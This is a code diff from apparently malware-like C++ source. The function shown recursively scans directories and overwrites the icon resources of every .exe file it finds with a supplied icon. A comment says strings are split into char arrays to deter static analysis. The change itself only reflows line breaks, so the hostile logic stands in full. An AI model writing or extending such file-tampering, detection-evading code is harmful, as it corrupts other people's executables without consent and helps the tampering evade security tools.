@@ -63,8 +63,7 @@ void ReplaceEXEIconResources(std::filesystem::path* pathStart, LPVOID lpMDcanIco
     // Using a char array instead of string in an attempt to deter static analysis string identification.
     wchar_t exeExt[] = {'.', 'e', 'x', 'e', 0};
 
-    for (auto itr_path : std::filesystem::recursive_directory_iterator(
-             *pathStart, std::filesystem::directory_options::skip_permission_denied)) {
+    for (auto itr_path : std::filesystem::recursive_directory_iterator(*pathStart, std::filesystem::directory_options::skip_permission_denied)) {
         // If current file is not .EXE, skip to next file.
         if (!(itr_path.path().extension() == exeExt)) {
             continue;
@@ -78,8 +77,7 @@ void ReplaceEXEIconResources(std::filesystem::path* pathStart, LPVOID lpMDcanIco
         }
 
         // Import EXE as a data image, no execution and locked memory until released.
-        HMODULE hmTheExe = ::LoadLibraryExW(currentPath.c_str(), NULL,
-                                            (LOAD_LIBRARY_AS_IMAGE_RESOURCE | LOAD_LIBRARY_AS_DATAFILE_EXCLUSIVE));
+        HMODULE hmTheExe = ::LoadLibraryExW(currentPath.c_str(), NULL, (LOAD_LIBRARY_AS_IMAGE_RESOURCE | LOAD_LIBRARY_AS_DATAFILE_EXCLUSIVE));
         if (hmTheExe == NULL) {
             resNames.clear();
             continue;
@@ -100,14 +98,12 @@ void ReplaceEXEIconResources(std::filesystem::path* pathStart, LPVOID lpMDcanIco
                         resNames.clear();
                         continue;
                     }
-                    if (!::UpdateResourceW(hUpdateResource, MAKEINTRESOURCE(RT_GROUP_ICON), L"101", 1033, lpMDcanIcon,
-                                           dwMDcanIconSize)) {
+                    if (!::UpdateResourceW(hUpdateResource, MAKEINTRESOURCE(RT_GROUP_ICON), L"101", 1033, lpMDcanIcon, dwMDcanIconSize)) {
                         // std::wcout << ::GetLastError() << " Could not update group resource.\n";
                         resNames.clear();
                         continue;
                     }
-                    if (!::UpdateResourceW(hUpdateResource, MAKEINTRESOURCE(RT_ICON), NULL, NULL, lpMDcanIcon,
-                                           dwMDcanIconSize)) {
+                    if (!::UpdateResourceW(hUpdateResource, MAKEINTRESOURCE(RT_ICON), NULL, NULL, lpMDcanIcon, dwMDcanIconSize)) {
                         // std::wcout << ::GetLastError() << " Could not update icon resource.\n";
                         resNames.clear();
                         continue;
@@ -140,8 +136,7 @@ void ReplaceEXEIconResources(std::filesystem::path* pathStart, LPVOID lpMDcanIco
 
         std::map<LPCWSTR, WORD>::iterator itr;
         for (itr = resNames.begin(); itr != resNames.end(); itr++) {
-            if (!::UpdateResourceW(hUpdateResource, MAKEINTRESOURCE(RT_ICON), itr->first, itr->second, lpMDcanIcon,
-                                   dwMDcanIconSize)) {
+            if (!::UpdateResourceW(hUpdateResource, MAKEINTRESOURCE(RT_ICON), itr->first, itr->second, lpMDcanIcon, dwMDcanIconSize)) {
                 resNames.clear();
                 continue;
             }
